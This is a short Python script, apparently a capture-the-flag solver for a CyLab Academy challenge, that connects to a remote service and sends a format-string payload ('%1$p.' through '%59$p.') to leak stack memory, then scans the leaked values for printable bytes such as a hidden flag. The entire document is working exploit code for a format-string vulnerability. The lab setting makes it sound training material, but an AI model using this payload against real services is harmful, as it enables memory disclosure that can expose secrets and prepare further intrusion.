import sys, socket, time, re, binascii
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST, PORT = "xebec.cylabacademy.net", 26615
s = socket.create_connection((HOST, PORT), timeout=12)
s.settimeout(6)
time.sleep(0.6)
try:
    s.recv(4096)
except Exception:
    pass
payload = "".join(f"%{i}$p." for i in range(1, 60)).encode()
s.sendall(payload + b"\n")
time.sleep(0.9)
out = b""
try:
    out = s.recv(65536)
except Exception:
    pass
txt = out.decode("utf-8", "replace")
print(txt[:400])
print("...")
vals = re.findall(r"0x[0-9a-f]+|\(nil\)", txt)
print("nb valeurs:", len(vals))
for i, v in enumerate(vals, 1):
    if v == "(nil)":
        continue
    n = int(v, 16)
    b = n.to_bytes(8, "little", signed=False)
    printable = sum(1 for c in b if 32 <= c < 127)
    if printable >= 5:
        print(f"pos {i}: {v} -> {b!r}")
s.close()
